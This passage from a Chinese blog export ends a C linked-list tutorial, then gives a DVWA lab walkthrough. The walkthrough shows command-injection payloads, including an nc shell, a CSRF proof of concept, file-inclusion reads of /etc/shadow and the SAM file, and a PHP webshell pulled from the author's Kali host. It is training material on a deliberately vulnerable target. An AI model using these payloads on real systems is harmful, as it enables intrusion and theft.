其实循环链表的删除和单链表的删除基本是一模一样的，无非就是多了一个更新尾结点的操作</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 删除循环链表中指定位置的元素</span><span class="token keyword">void</span> <span class="token function">DeleteCircularLinkList</span><span class="token punctuation">(</span>CircularLinkList <span class="token operator">*</span>linkList<span class="token punctuation">,</span> <span class="token keyword">int</span> pos<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    CircularNode <span class="token operator">*</span>node <span class="token operator">=</span> linkList<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pos <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        CircularNode <span class="token operator">*</span>lastNode <span class="token operator">=</span> linkList<span class="token operator">-></span>next<span class="token punctuation">;</span> <span class="token comment">//找到最后一个结点</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> linkList<span class="token operator">-></span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            lastNode <span class="token operator">=</span> lastNode<span class="token operator">-></span>next<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        lastNode<span class="token operator">-></span>next <span class="token operator">=</span> node<span class="token operator">-></span>next<span class="token punctuation">;</span> <span class="token comment">// 重新设置尾指针</span>        linkList<span class="token operator">-></span>next <span class="token operator">=</span> node<span class="token operator">-></span>next<span class="token punctuation">;</span> <span class="token comment">// 重新设置头指针</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span>        <span class="token comment">// 找到要删除的结点的前一个结点</span>        CircularNode <span class="token operator">*</span> preNode <span class="token operator">=</span> linkList<span class="token operator">-></span>next<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> pos <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            preNode <span class="token operator">=</span> preNode<span class="token operator">-></span>next<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        node <span class="token operator">=</span> preNode<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token comment">//要删除的结点地址</span>        preNode<span class="token operator">-></span>next <span class="token operator">=</span> node<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token function">free</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>    linkList<span class="token operator">-></span>length<span class="token operator">--</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="循环链表的特殊遍历法"><a href="#循环链表的特殊遍历法" class="headerlink" title="循环链表的特殊遍历法"></a>循环链表的特殊遍历法</h4><p>　　通过给定的某个位置，循环遍历出链表中的每个元素<br>　　只需要先拷贝当前要位置的结点的地址，用do while循环遍历，当下一个地址不等于拷贝的地址就循环打印即可</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 通过给定的某个位置，循环遍历出链表中的每个元素</span><span class="token keyword">void</span> <span class="token function">PrintCircularLinkListByNode</span><span class="token punctuation">(</span>CircularLinkList <span class="token operator">*</span> linkList<span class="token punctuation">,</span><span class="token keyword">int</span> pos<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    CircularNode <span class="token operator">*</span> node <span class="token operator">=</span> linkList<span class="token operator">-></span>next<span class="token punctuation">;</span>         <span class="token keyword">if</span><span class="token punctuation">(</span>node <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> pos <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">||</span> pos <span class="token operator">></span> linkList<span class="token operator">-></span>length<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token comment">//获取到pos位置的结点的地址</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> pos<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        node <span class="token operator">=</span> node<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        CircularNode <span class="token operator">*</span> BackupNode <span class="token operator">=</span> node<span class="token punctuation">;</span>     <span class="token comment">//拷贝该结点的地址</span>    <span class="token keyword">do</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d "</span><span class="token punctuation">,</span>node<span class="token operator">-></span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>        node <span class="token operator">=</span> node<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">while</span><span class="token punctuation">(</span>node <span class="token operator">!=</span> BackupNode<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="双向链表"><a href="#双向链表" class="headerlink" title="双向链表"></a>双向链表</h3><p>　　双向链表只是在单链表的基础上，多了一个前缀结点，就多了一份存储空间，相当于用空间换时间</p><h4 id="结构图-2"><a href="#结构图-2" class="headerlink" title="结构图"></a>结构图</h4><p><img src="https://s1.ax1x.com/2020/07/19/URHtYR.png"><br>　　老规矩，先创建结点和头结点</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/** 双向链表的结点,包含一个数据域和两个指针域 */</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">Node</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> id<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">Node</span> <span class="token operator">*</span> next<span class="token punctuation">;</span>     <span class="token comment">//指向前缀结点</span>    <span class="token keyword">struct</span> <span class="token class-name">Node</span> <span class="token operator">*</span> prev<span class="token punctuation">;</span>     <span class="token comment">//指向后继结点</span><span class="token punctuation">&#125;</span>Node<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/** 双向链表 */</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">LinkList</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> length<span class="token punctuation">;</span>    Node <span class="token operator">*</span> next<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>LinkList<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="双向链表的插入"><a href="#双向链表的插入" class="headerlink" title="双向链表的插入"></a>双向链表的插入</h4><p>　　<b>第一种情况</b>:插入的位置在第一个，链表为空<br>　　<img src="https://s1.ax1x.com/2020/07/19/URjjj1.gif"><br>　　<b>第二种情况</b>:插入的位置在第一个，链表不为空<br>　　<img src="https://s1.ax1x.com/2020/07/19/URzXcj.gif"><br>　　<b>第三种情况</b>:插入的位置在中间<br>　　<img src="https://s1.ax1x.com/2020/07/19/URxJRH.gif"><br>　　<b>第四种情况</b>:插入的位置在最后<br>　　<img src="https://s1.ax1x.com/2020/07/19/UWSIxJ.gif"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 向双向链表指向位置插入元素</span><span class="token keyword">void</span> <span class="token function">InsertDoublyLinkList</span><span class="token punctuation">(</span>LinkList <span class="token operator">*</span> linkList<span class="token punctuation">,</span><span class="token keyword">int</span> pos<span class="token punctuation">,</span><span class="token keyword">int</span> id<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// 创建空结点</span>    Node <span class="token operator">*</span> node <span class="token operator">=</span> <span class="token punctuation">(</span>Node <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>Node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    node<span class="token operator">-></span>id <span class="token operator">=</span> id<span class="token punctuation">;</span>    node<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    node<span class="token operator">-></span>prev <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>pos <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>    <span class="token comment">//链表不为空</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>linkList<span class="token operator">-></span>length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>           node<span class="token operator">-></span>next <span class="token operator">=</span> linkList<span class="token operator">-></span>next<span class="token punctuation">;</span>           linkList<span class="token operator">-></span>next<span class="token operator">-></span>prev <span class="token operator">=</span> node<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        linkList<span class="token operator">-></span>next <span class="token operator">=</span> node<span class="token punctuation">;</span>  <span class="token comment">//更新头指针</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span>        Node <span class="token operator">*</span> preNode <span class="token operator">=</span> linkList<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token comment">//获取到要插入位置的前缀结点</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> pos <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            preNode <span class="token operator">=</span> preNode<span class="token operator">-></span>next<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// 在中间插入</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>preNode<span class="token operator">-></span>next <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            node<span class="token operator">-></span>next <span class="token operator">=</span> preNode<span class="token operator">-></span>next<span class="token punctuation">;</span>            preNode<span class="token operator">-></span>next<span class="token operator">-></span>prev <span class="token operator">=</span> node<span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>        node<span class="token operator">-></span>prev <span class="token operator">=</span> preNode<span class="token punctuation">;</span>           preNode<span class="token operator">-></span>next <span class="token operator">=</span> node<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        linkList<span class="token operator">-></span>length<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="双向链表的删除"><a href="#双向链表的删除" class="headerlink" title="双向链表的删除"></a>双向链表的删除</h4><p>　　<b>第一种情况</b>:删除的位置在第一个，链表长度为1<br>　　<img src="https://s1.ax1x.com/2020/07/19/UW90Xj.gif"></p><p>　　请勿将代码直接写成 头指针=null (linkList-&gt;next = null)的形式，而是换一种等价写为法:linkList-&gt;next = node-&gt;next，这种写法将直接减少代码行数<br>　　<b>第二种情况</b>:删除的位置在第一个，链表长度不为1<br>　　<img src="https://s1.ax1x.com/2020/07/19/UWCvGT.gif"><br>　　<b>第三种情况</b>:删除的位置在中间<br>　　<img src="https://s1.ax1x.com/2020/07/19/UWiG7R.gif"><br>　　<b>第四种情况</b>:删除的位置在最后<br>　　<img src="https://s1.ax1x.com/2020/07/19/UWkUyD.gif"><br>　　这里找删除结点跟前两个不一样，因为有了前缀结点，所以找结点的时候直接找到要删除的结点即可，而不是要删除的结点的前缀结点</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 在指定位置删除元素</span><span class="token keyword">void</span> <span class="token function">DeleteLinkList</span><span class="token punctuation">(</span>LinkList <span class="token operator">*</span> linkList<span class="token punctuation">,</span><span class="token keyword">int</span> pos<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    Node <span class="token operator">*</span> node <span class="token operator">=</span> linkList<span class="token operator">-></span>next<span class="token punctuation">;</span>   <span class="token comment">//获取到链表的第一个结点</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pos <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token comment">// 链表长度不为1</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>node<span class="token operator">-></span>next <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            node<span class="token operator">-></span>next<span class="token operator">-></span>prev <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        linkList<span class="token operator">-></span>next <span class="token operator">=</span> node<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token comment">//更新头指针</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span>        <span class="token comment">// 循环找到要删除的结点的位置</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> pos<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            node <span class="token operator">=</span> node<span class="token operator">-></span>next<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        node<span class="token operator">-></span>prev<span class="token operator">-></span>next <span class="token operator">=</span> node<span class="token operator">-></span>next<span class="token punctuation">;</span>        <span class="token comment">// 不是在最后一个位置删除</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>node<span class="token operator">-></span>next <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            node<span class="token operator">-></span>next<span class="token operator">-></span>prev <span class="token operator">=</span> node<span class="token operator">-></span>prev<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">free</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>    linkList<span class="token operator">-></span>length<span class="token operator">--</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>　　至此，链表的核心操作就介绍完了，感谢大家的阅读！为了更好的理解链表的详细操作步骤，本人花费大量的时间做出这些gif图片。如果你要使用这些图片，请包含出处等信息，在此谢谢各位大佬！</p>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA</title>
      <link href="2020/57354.html"/>
      <url>2020/57354.html</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在大约2017-2018年时间就安装过dvwa，那时候只对安全方面感兴趣，也不知道这玩意是干啥的，所以果断安装好后就被我搁置了。最近这段时间，重新学习安全体系，才知道dvwa是一个非常优秀的靶场。闲话不多说，本章介绍dvwa基本过关锦集，献给我第一个学习靶场dvwa。<br><a id="more"></a><br>靶机使用的是Metasploitable2-Linux集成的dvwa环境，不同的dvwa版本，难度选项有些有4个最后一个选项是impossible，我的只有3个，即high=impossible。</p><h3 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h3><p>　　爆破表单，主要看你的字典内容是否丰富，首先打开burp，抓包拦截后放进intruder模块。我写过burp使用教程，不懂的移步<a target="_blank" href="http://www.maidang.cool/2020/48647.html">burpsuite使用教程</a>，不多说了。<br>　　low级别，设置好攻击变量，攻击类型Cluster bomb后，开始设置payloads。<br>　　<img src="https://s1.ax1x.com/2020/04/21/JGmedH.png"><br>　　因为知道用户名和密码，为了不浪费时间，我就随便添加几个，如图所示。<br>　　<img src="https://s1.ax1x.com/2020/04/21/JGnwAH.png"><br>　　点击attack后，根据length排序找到正确的用户名和密码<br>　　<img src="https://s1.ax1x.com/2020/04/24/JDDop6.png"><br>　　medium级别，还是跟上面一模一样的配置，开始攻击后，情况跟low级别的代码一模一样，我一度以为我是不是没有调整级别。<br>　　high级别下，每次发包会延迟2s，但是只要你有耐心，也能爆破出来不是吗。</p><h3 id="Command-Execution"><a href="#Command-Execution" class="headerlink" title="Command Execution"></a>Command Execution</h3><p>　　执行模块，low级别下。首先可以看到输入一个ip地址，那么先输入一个正确的ip地址127.0.0.1试试<br>　　<img src="https://s1.ax1x.com/2020/04/21/JGM89s.png"><br>　　回显正确，试试加入管道符：127.0.0.1 &amp;&amp; ls<br>　　<img src="https://s1.ax1x.com/2020/04/21/JG3lq0.png"><br>　　命令成功执行，查看源码，创建一个target变量，后面直接执行ping target，无任何消毒机制<br>　　<img src="https://s1.ax1x.com/2020/04/21/JGGE9g.png"><br>　　执行;mkfifo /tmp/pipe;sh /tmp/pipe | nc -lvp 4444 &gt; /tmp/pipe后，你会发现最上面的标签栏有个圈圈会不停的转，利用nc连接可以直接得到shell，权限也不是root还要进一步提权。<br>　　<img src="https://s1.ax1x.com/2020/04/22/JNfJsg.png"><br>　　medium级别，还是试试127.0.0.1 &amp;&amp; ls，执行后发现无任何回显。说明过滤了’&amp;’换一种姿势试了127.0.0.1 ; ls无果。 尝试127.0.0.1 | ls<br>　　<img src="https://s1.ax1x.com/2020/04/21/JGJePO.png"><br>　　命令有效，那么在试试127.0.0.1 &amp;&amp;&amp; ls 呢<br>　　<img src="https://s1.ax1x.com/2020/04/21/JGY9Ff.png"><br>　　猜测只过滤一次&amp;那么过滤完后的payload就为127.0.0.1 &amp;&amp; ls了，127.0. || ls也是可以成功执行的，也就是说没有过滤’|’。直接看源码<br>　　<img src="https://s1.ax1x.com/2020/04/21/JGtwEq.png"><br>　　嗯，好吧我承认猜测情况有点差别。它的过滤机制是将’&amp;&amp;’字符变成空字符，将’;’同样变成空字符。<br>　　high级别，我尝试了上述所有payload后无果，好吧直接看源码。看它的消毒机制怎么写的如此完善。<br>　　<img src="https://s1.ax1x.com/2020/04/21/JGNeiV.png"><br>　　看不懂没关系，因为我也没有学过php，但学过其他语言的我，基本还是能懂点啥意思，它的过滤机制是只能输入一个ip，如果不是一个正确的ip就出现ERROR: You have entered an invalid IP。所以不存在命令执行，当然你有什么方法能绕过，请一定一定要联系我。我也想知道这到底怎么绕。</p><h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>　　跨站请求伪造，以下为我对这个csrf的理解<br>　　有一个站点a，里面有修改密码的功能，此功能中只有一个修改密码框，你只需要输入要修改的密码后，点提交就能成功修改密码了。如修改密码为123<br>　　然后查看url发现是get方式如 http://<span>www</span>.xxx.com?password_new=123，猜测是否可以直接修改url中的123来修改密码，于是乎试试提交http://<span>www</span>.xxx.com?password_new=456。发现成功将自己的密码修改成了456。<br>　　那么问题来了，是不是只要在你已经登录了此a站点的情况下，攻击者发给你这个http://<span>www</span>.xxx.com?password_new=xxx，xxx是对方设置的密码，你的密码就会被成功修改？答案是肯定的，这就是一个非常非常简单的csrf。为啥非得要你登陆了此站点下点链接，才会被修改，这个问题不言而喻吧。<br>　　low级别，在burp中有csrf功能，直接开burp，截取到数据包后点击Generate CSRF PoC<br>　   <img src="https://s1.ax1x.com/2020/04/21/JGD9kd.png"><br>　　下面的框中给出了csrf html代码。可以看到我将密码设置成了passwd<br>　   <img src="https://s1.ax1x.com/2020/04/21/JGssTe.png"><br>　　选择最下面的Copy HTML。当然你也可以直接点击Test in browser，不知道为啥我这里无效，所以只能手动保存为html文件<br>　　运行此html后，就是一个非常简单的提交框，点击后密码就会被改变，当然如果在真实的环境下，你要做的尽量真实。比如rtx2080ti大减价，点开链接疯狂抢购啥的。<br>　　<img src="https://s1.ax1x.com/2020/04/21/JG6aqK.png"><br>　　点击提交框后，密码修改成功<br>　　<img src="https://s1.ax1x.com/2020/04/21/JGcI0K.png"><br>　　查看源码，中间将新的密码通过sql命令更新，可能这里也存在sql注入漏洞，无任何消毒csrf机制，mysql_real_escape_string有消毒sql命令<br>　　<img src="https://s1.ax1x.com/2020/04/21/JG2QVf.png"><br>　　medium级别，上述过程全部一样，然后直接点提交按钮后，发现无任何内容，密码修改不成功。嗯我选择放弃，直接查看源码<br>　　<img src="https://s1.ax1x.com/2020/04/21/JGfjdx.png"><br>　　多了if判断，referer头是否来自127.0.0.1即本机，嗯这个简单，点击提交功能后，burp拦截下来，添加referer头为127.0.0.1。<br>　　<img src="https://s1.ax1x.com/2020/04/21/JGhL9S.png"><br>　　forward后，成功修改密码<br>　　high级别，你可以看到多了一个输入原密码的框，所以不存在csrf。</p><h3 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h3><p>　　文件包含漏洞，分为本地文件包含和远程文件包含，php里面的我不是太懂，所以我也不会乱说，详细了解移步<a href="https://www.freebuf.com/articles/web/182280.html">freebuf文件包含</a>。<br>　　本地文件包含直接可以查看到本地文件，造成信息泄露<br>　　<img src="https://s1.ax1x.com/2020/04/21/JGOq6P.png"><br>　　可以看到passwd文本中的内容，以下是常见的存储位置<br>Windows系统<br><pre class="line-numbers language-none"><code class="language-none">c:\boot.ini  &#x2F;&#x2F; 查看系统版本c:\windows\system32\inetsrv\MetaBase.xml &#x2F;&#x2F; IIS配置文件c:\windows\repair\sam &#x2F;&#x2F; 存储Windows系统初次安装的密码c:\ProgramFiles\mysql\my.ini &#x2F;&#x2F; MySQL配置c:\ProgramFiles\mysql\data\mysql\user.MYD &#x2F;&#x2F; MySQL root密码c:\windows\php.ini &#x2F;&#x2F; php 配置信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>Linux/Unix系统<br><pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;passwd &#x2F;&#x2F; 账户信息&#x2F;etc&#x2F;shadow &#x2F;&#x2F; 账户密码文件&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apache2默认配置文件&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhost.conf &#x2F;&#x2F; 虚拟网站配置&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F; PHP相关配置&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apache配置文件&#x2F;etc&#x2F;my.conf &#x2F;&#x2F; mysql 配置文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>　　远程文件包含，首先启动kali中的apach2服务<br>　　输入service apache2 start，成功开启后没有任何提示，输入cd /var/www/html来到站点目录下。创建一个1.txt文件内容为&lt;?php echo shell_exec($_GET[‘cmd’]);?<span>&gt;</span>，这句话意思是执行shell命令<br>　　访问该站点看是否能正常读取文件内容<br>　　<img src="https://s1.ax1x.com/2020/04/21/JJSnQs.png"><br>　　成功执行ls命令，如果在low的级别下远程包含出错移步<a href="https://blog.csdn.net/wang_624/article/details/90381314">解决远程文件包含出错</a>，所以远程文件包含远远不是信息泄露的问题了，已经上升到命令执行了，当然你也可以拿shell了。<br>　　<img src="https://s1.ax1x.com/2020/04/21/JJ7XQK.png"><br>　　low级别源码为<br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>     <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//The page we wish to display  </span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>　　medium级别下，本地文件包含漏洞也无任何过滤，试试远程文件包含，http://<span></span>192.168.2.161/1.txt&amp;cmd=ls，执行后发现无任何反应，产生过滤。可以考虑转换成url编码进行绕过<br>　　<img src="https://s1.ax1x.com/2020/04/22/JtS5tK.png"><br>　　执行后，发现url部分’http’被解码了，也被过滤了<br>　　<img src="https://s1.ax1x.com/2020/04/22/JtSzh8.png"><br>　　可以尝试双层编码，即刚刚的编码再次编码一次<br>　　<img src="https://s1.ax1x.com/2020/04/22/JtpDHI.png"><br>　　双层后url已经非常长了，复制后再次提交，还是无任何反应。猜测可能只对http头部分过滤成空字符，于是再次构造payload为<span>httphttp://<span></span>192.168.2.161/1.txt&amp;cmd=ls</span>，还是无任何反应，改为http://<span>http://<span></span>192.168.2.161/1.txt&amp;cmd=ls</span>，执行后也无任何反应。有点神奇，试试改变http://的位置后变为hthttp<span></span>://tp://192.168.2.161/1.txt&amp;cmd=ls后，命令成功执行说明过滤的很可能是’http://‘这一部分。<br>　　源码为：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>     <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// The page we wish to display </span>    <span class="token comment">// Bad input validation </span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"http://"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"https://"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>　　将http:// https:// 过滤掉，查阅str_replace函数，发现此函数是区分大小写的，所以我重新构造url为HTTP://<span></span>192.168.2.161/1.txt&amp;cmd=ls，发现还是不能成功执行，这个是我的疑惑点所在<br>　　high级别，直接查看源码，因为过不了不浪费时间</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>       <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//The page we wish to display  </span>    <span class="token comment">// Only allow include.php </span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$file</span> <span class="token operator">!=</span> <span class="token double-quoted-string string">"include.php"</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">echo</span> <span class="token double-quoted-string string">"ERROR: File not found!"</span><span class="token punctuation">;</span>         <span class="token keyword">exit</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>    <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>　　写的很清楚了，url中只能有include.php，所以不存在文件包含漏洞</p><h3 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h3><p>　　SQL注入，我不会非常详细的写手工注入过程，因为实在是太长，太繁琐了。讲讲我理解的漏洞产生原理。最好你有sql命令基础。将用户提交的值带进sql查询语句，由于没有过滤用户提交的字符，从而导致的sql注入攻击。<br>　　<b>按照注入点类型来分类</b><br>　　数字型注入点、字符型注入点、搜索型注入点<br>　　<b>按照数据提交的方式来分类</b><br>　　GET 注入、POST 注入、Cookie 注入、HTTP 头部注入<br>　　<b>按照执行效果来分类</b><br>　　基于布尔的盲注、基于时间的盲注、基于报错注入、联合查询注入、堆查询注入、宽字节注入<br>　　这里的环境是报错注入，说的有点含糊直接看源码。<br>　　